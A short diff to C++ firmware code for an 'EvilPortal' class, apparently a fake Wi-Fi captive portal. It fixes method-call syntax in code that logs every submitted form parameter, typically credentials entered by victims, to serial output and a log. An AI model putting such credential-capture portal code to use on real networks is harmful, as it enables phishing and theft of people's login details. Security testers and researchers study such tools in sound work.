@@ -49,7 +49,7 @@ void EvilPortal::setupServer() {
     int params = request->params();
     for(int i=0; i < params; i++){
         AsyncWebParameter* p = request->getParam(i);
-        this->params_log += p->name + ": " + p->value;
+        this->params_log += p->name() + ": " + p->value();
         this->something_received = true;
     }
 
@@ -307,7 +307,7 @@ void EvilPortal::main(uint8_t scan_mode) {
     if (this->something_received) {
       this->something_received = false;
       
-      if (this->params_log.length)
+      if (this->params_log.length() > 0)
         this->params_log = this->params_log + "\n";
         Serial.print(this->params_log);
         this->addLog(this->params_log, this->params_log.length());
